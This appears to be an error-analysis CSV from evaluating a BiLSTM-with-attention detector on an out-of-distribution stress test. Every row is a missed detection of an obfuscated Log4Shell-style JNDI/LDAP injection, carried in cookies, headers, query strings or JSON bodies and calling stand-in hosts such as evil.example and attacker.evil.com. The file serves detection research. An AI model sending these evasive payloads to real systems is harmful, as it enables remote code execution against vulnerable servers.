model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
BiLSTM + Attention,ood_stress_test.csv,OOD-900008,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}; sid=ood900008,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}; sid=ood900008,1,0,5.10674999532057e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900123,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.123 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.123 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d,1,0,3.892246695613721e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900109,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://probe.example.net/date-fragment}&request_id=ood-900109 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://probe.example.net/date-fragment}&request_id=ood-900109 http/1.1 host: victim.local,1,0,8.944497494667303e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900061,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://log4j-test.invalid/date-fragment}&request_id=ood-900061 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://log4j-test.invalid/date-fragment}&request_id=ood-900061 http/1.1 host: victim.local,1,0,8.47689534566598e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900144,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}; sid=ood900144,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys}; sid=ood900144,1,0,5.55036331206793e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900113,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}&request_id=ood-900113 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}&request_id=ood-900113 http/1.1 host: victim.local,1,0,8.259629794338252e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900054,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}"",""host"":""log4j-test.invalid""}",1,0,1.1321908459649421e-05,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900098,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d"",""host"":""probe.example.net""}",1,0,7.919332347228192e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900049,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D&request_id=ood-900049 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d&request_id=ood-900049 http/1.1 host: victim.local,1,0,4.603651177603751e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900084,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}; sid=ood900084,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}; sid=ood900084,1,0,6.022664365445962e-06,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900032,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}; sid=ood900032,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}; sid=ood900032,1,0,5.42340376341599e-06,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900028,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D; sid=ood900028,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d; sid=ood900028,1,0,3.848842425213661e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900075,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.75 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.75 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d,1,0,3.5989855859952513e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900099,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.99 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.99 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d,1,0,3.6976737192162545e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900129,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}&request_id=ood-900129 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://lab-callback.example.org/unsupported-namespace}&request_id=ood-900129 http/1.1 host: victim.local,1,0,7.96650056145154e-06,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900012,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}; sid=ood900012,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}; sid=ood900012,1,0,5.898673862247961e-06,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900137,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}&request_id=ood-900137 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}&request_id=ood-900137 http/1.1 host: victim.local,1,0,8.85748249856988e-06,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900052,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D; sid=ood900052,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d; sid=ood900052,1,0,3.976250809500925e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900003,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.3 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.3 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d,1,0,3.520372729326482e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900124,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D; sid=ood900124,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d; sid=ood900124,1,0,3.976391326432349e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900002,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d"",""host"":""evil.example""}",1,0,6.89667513142922e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900118,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}"",""host"":""probe.example.net""}",1,0,1.322015123150777e-05,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900070,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}"",""host"":""log4j-test.invalid""}",1,0,1.0661447049642447e-05,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900088,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://callback.local/date-fragment}; sid=ood900088,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://callback.local/date-fragment}; sid=ood900088,1,0,6.5547615122341085e-06,0.49999999999999994,false_negative_unknown_obfuscation,date_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900001,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D&request_id=ood-900001 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d&request_id=ood-900001 http/1.1 host: victim.local,1,0,4.234952484694077e-06,0.49999999999999994,false_negative_unknown_obfuscation,iis_percent_u_encoding,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900120,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}; sid=ood900120,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}; sid=ood900120,1,0,5.220932052907301e-06,0.49999999999999994,false_negative_unknown_obfuscation,protocol_fragment_sys_lookup,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900030,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://attacker.evil.com/sys-separator}"",""host"":""attacker.evil.com""}",1,0,1.2561007679323666e-05,0.49999999999999994,false_negative_unknown_obfuscation,sys_lookup_separator,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900114,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}"",""host"":""probe.example.net""}",1,0,1.4640778317698278e-05,0.49999999999999994,false_negative_unknown_obfuscation,charcode_lookup_reconstruction,Model score disagreed with the dataset label at the evaluation threshold.
BiLSTM + Attention,ood_stress_test.csv,OOD-900058,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}"",""host"":""log4j-test.invalid""}",1,0,1.1420983355492353e-05,0.49999999999999994,false_negative_unknown_obfuscation,unsupported_lookup_namespace,Model score disagreed with the dataset label at the evaluation threshold.
